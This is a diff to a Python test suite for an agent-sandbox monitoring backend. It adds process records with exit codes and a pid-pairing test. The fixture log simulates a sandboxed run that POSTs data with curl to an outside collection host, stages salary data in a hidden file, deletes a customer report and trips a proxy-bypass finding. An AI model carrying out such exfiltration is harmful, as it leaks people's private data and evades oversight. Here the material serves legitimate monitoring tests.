@@ -9,6 +9,7 @@ from midojo.backends.openshell import (
     OpenShellBackend,
     OpenShellEnvironment,
     OpenShellObservations,
+    ProcessRecord,
     _resolve_policy,
 )
 from midojo.backends.openshell.logs import parse_ocsf_lines
@@ -58,6 +59,7 @@ class TestObserve:
                 "PROC:LAUNCH [INFO] curl(103) [cmd:curl -X POST https://audit.ext-log.com/collect]",
                 "NET:OPEN [MED] DENIED curl(103) -> audit.ext-log.com:443 [policy:- engine:opa]",
                 'FINDING:BLOCKED [MED] "Proxy Bypass Detected" [confidence:high]',
+                "PROC:TERMINATE [INFO] curl(103) [exit:56]",
             ]
         )
         files = "/sandbox/workdir/notes.txt\n/sandbox/workdir/.staging_cache\n"
@@ -76,11 +78,32 @@ class TestObserve:
             files_modified=["/sandbox/workdir/notes.txt"],
             files_deleted=["/sandbox/workdir/customer_report.txt"],
             workdir_new_file_contents={"/sandbox/workdir/.staging_cache": "Alice $45K"},
-            process_commands=["curl -X POST https://audit.ext-log.com/collect"],
-            processes_launched=["curl"],
+            processes=[
+                ProcessRecord(
+                    binary="curl", pid=103, command="curl -X POST https://audit.ext-log.com/collect", exit_code=56
+                )
+            ],
             network_calls_blocked=["audit.ext-log.com:443"],
             security_findings=["Proxy Bypass Detected"],
         )
+
+
+def test_ocsf_pairs_each_exit_with_the_latest_launch_of_its_pid():
+    ocsf = parse_ocsf_lines(
+        [
+            "PROC:LAUNCH [INFO] sh(40) [cmd:sh -c ./build.sh]",
+            "PROC:TERMINATE [INFO] make(39) [exit:2]",  # no matching launch
+            "PROC:LAUNCH [INFO] curl(41) [cmd:curl https://example.com]",
+            "PROC:TERMINATE [INFO] curl(41) [exit:6]",
+            "PROC:LAUNCH [INFO] cat(41) [cmd:cat notes.txt]",  # pid 41 reused
+            "PROC:TERMINATE [INFO] cat(41) [exit:0]",
+        ]
+    )
+    assert [(p.binary, p.pid, p.command, p.exit_code) for p in ocsf.processes] == [
+        ("sh", 40, "sh -c ./build.sh", None),
+        ("curl", 41, "curl https://example.com", 6),
+        ("cat", 41, "cat notes.txt", 0),
+    ]
 
 
 class TestProperties:
